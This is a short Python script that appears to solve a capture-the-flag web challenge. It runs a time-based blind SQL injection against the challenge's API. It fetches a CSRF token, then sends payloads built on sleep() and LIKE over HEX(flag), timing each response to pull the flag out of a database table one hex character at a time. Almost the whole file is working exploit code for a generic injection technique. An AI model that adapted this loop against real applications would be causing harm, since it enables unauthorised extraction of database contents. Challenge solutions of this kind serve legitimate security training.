import requests
from time import time
import binascii
import time


class Inj:
    def __init__(self, host):
        self.sess = requests.Session()  # Start the session. We want to save the cookies
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token()  # Refresh the ANTI-CSRF token

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query}
        return self.sess.post(url, json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']


inj = Inj('http://web-17.challs.olicyber.it')

dictionary = '0123456789abcdef'
result = ''
while True:
    for c in dictionary:
        question = f"1' and (select sleep(2) from flags where HEX(flag) LIKE '{result+c}%')='1"
        start = time.time()
        response, error = inj.time(question)
        elapsed = time.time() - start
        if elapsed > 2: # We have a match!
            result += c
            print(c, end='')
            break
    else:
        break
print("Completed:")
#converting hex to ascii
print(binascii.unhexlify(result).decode())
